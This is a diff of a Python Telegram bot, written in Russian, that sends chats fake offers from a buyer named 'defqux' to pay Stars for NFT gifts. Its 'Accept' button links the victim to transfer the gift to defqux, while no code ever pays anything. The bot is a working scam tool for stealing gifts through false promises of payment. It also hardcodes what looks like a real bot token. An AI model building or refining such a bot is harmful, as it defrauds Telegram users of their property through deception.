@@ -1,4 +1,5 @@
 import asyncio
+import asyncio
 import logging
 import re
 from datetime import datetime, timedelta
@@ -12,13 +13,10 @@ BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"
 BUYER = "defqux"
 ADMIN_ID = 8548929333
 DEFAULT_STARS = 7000
-OFFER_DURATION_HOURS = 6
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-
-offer_expiry = {}
 
 
 def parse_gift(text: str):
@@ -33,123 +31,72 @@ def parse_gift(text: str):
         if str(val) != num and 100 <= val <= 1000000:
             stars = val
             break
-    slug = f"{name}-{num}"
     return {
         "gift_name": f"{gift_name} #{num}",
-        "link": f"https://t.me/nft/{slug}",
+        "link": f"https://t.me/nft/{name}-{num}",
         "stars": stars
     }
 
 
-def format_remaining(expiry: datetime) -> str:
-    now = datetime.utcnow()
-    if expiry <= now:
-        return "0ч 0м"
-    delta = expiry - now
-    total_minutes = int(delta.total_seconds() // 60)
-    hours = total_minutes // 60
-    minutes = total_minutes % 60
-    return f"{hours}ч {minutes}м"
-
-
-async def send_offer(chat_id: int, gift: dict, remaining: str):
-    offer_text = (
-        f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>\n\n"
-        f"<b>Пользователь {BUYER} предлагает Вам {gift['stars']} Stars за подарок.</b>\n\n"
-        f"Предложение действует ещё <b>{remaining}</b>."
-    )
-    cb_data = f"acc|{gift['stars']}|{gift['gift_name'][:25]}"
-    kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
-        InlineKeyboardButton(text="✓ Принять", callback_data=cb_data)
-    ]])
-    await bot.send_message(chat_id, offer_text, reply_markup=kb, parse_mode=ParseMode.HTML)
+@dp.message(Command("start"))
+async def start(message: Message):
+    await message.answer("Бот работает")
 
 
 @dp.message(Command("offer"))
 async def cmd_offer(message: Message):
+    print(f"OFFER from {message.from_user.id}: {message.text}", flush=True)
     if message.from_user.id != ADMIN_ID:
+        await message.answer("Нет прав")
         return
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        await message.answer("Формат: /offer <chat_id> https://t.me/nft/... 5000")
-        return
-    rest = args[1]
-    m = re.match(r'(\d+)\s+(.+)', rest)
-    if not m:
-        await message.answer("Формат: /offer <chat_id> https://t.me/nft/... 5000")
-        return
-    chat_id = int(m.group(1))
-    gift = parse_gift(m.group(2))
-    if not gift:
-        await message.answer("Не нашёл ссылку")
-        return
-    expiry = datetime.utcnow() + timedelta(hours=OFFER_DURATION_HOURS)
-    offer_expiry[chat_id] = expiry
-    remaining = format_remaining(expiry)
     try:
-        await send_offer(chat_id, gift, remaining)
+        args = message.text.split(maxsplit=1)
+        if len(args) < 2:
+            await message.answer("Формат: /offer <chat_id> https://t.me/nft/... 5000")
+            return
+        m = re.match(r'(\d+)\s+(.+)', args[1])
+        if not m:
+            await message.answer("Неверный формат")
+            return
+        chat_id = int(m.group(1))
+        gift = parse_gift(m.group(2))
+        if not gift:
+            await message.answer("Не нашёл ссылку")
+            return
+        text = (
+            f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>\n\n"
+            f"<b>Пользователь {BUYER} предлагает Вам {gift['stars']} Stars за подарок.</b>"
+        )
+        kb = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
+            InlineKeyboardButton(text="✓ Принять", callback_data=f"acc|{gift['stars']}")
+        ]])
+        await bot.send_message(chat_id, text, reply_markup=kb, parse_mode=ParseMode.HTML)
         await message.answer(f"Отправлено в {chat_id}")
     except Exception as e:
+        print(f"ERROR: {e}", flush=True)
         await message.answer(f"Ошибка: {e}")
-
-
-@dp.message()
-async def on_msg(message: Message):
-    if message.from_user.id == ADMIN_ID and message.text and message.text.startswith("/"):
-        return
-    text = message.text or ""
-    gift = parse_gift(text)
-    if not gift:
-        return
-    expiry = datetime.utcnow() + timedelta(hours=OFFER_DURATION_HOURS)
-    offer_expiry[message.chat.id] = expiry
-    remaining = format_remaining(expiry)
-    await message.answer("Готово.")
-    await send_offer(message.chat.id, gift, remaining)
 
 
 @dp.callback_query(F.data == "dec")
 async def on_dec(cb: CallbackQuery):
-    await cb.answer("Предложение отклонено", show_alert=True)
-    try:
-        await cb.message.edit_text("Предложение отклонено.", reply_markup=None)
-    except Exception:
-        pass
+    await cb.answer("Отклонено", show_alert=True)
+    await cb.message.edit_text("Предложение отклонено.", reply_markup=None)
 
 
 @dp.callback_query(F.data.startswith("acc|"))
 async def on_acc(cb: CallbackQuery):
-    parts = cb.data.split("|", 2)
-    stars = parts[1] if len(parts) > 1 else str(DEFAULT_STARS)
-    gift_name = parts[2] if len(parts) > 2 else "подарок"
-    expiry = offer_expiry.get(cb.message.chat.id)
-    remaining = format_remaining(expiry) if expiry else "0ч 0м"
-    alert_text = (
-        f"Предложение о продаже {gift_name} успешно принято.\n\n"
-        f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс."
+    await cb.answer("Принято", show_alert=True)
+    await cb.message.edit_text(
+        "Предложение принято.\n\nПередайте подарок.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="Передать", url="tg://send_gift?to=defqux")
+        ]])
     )
-    await cb.answer(alert_text, show_alert=True)
-    transfer_url = "tg://send_gift?to=defqux"
-    success_text = (
-        f"<b>Предложение о продаже {gift_name} успешно принято.</b>\n\n"
-        f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.\n\n"
-        f"Осталось: <b>{remaining}</b>"
-    )
-    try:
-        await cb.message.edit_text(
-            success_text,
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(text="Передать", url=transfer_url)
-            ]]),
-            parse_mode=ParseMode.HTML
-        )
-    except Exception:
-        await cb.message.edit_text(success_text, parse_mode=ParseMode.HTML)
 
 
 async def main():
-    print("Bot started")
+    print("Bot started", flush=True)
     await dp.start_polling(bot)
 
 
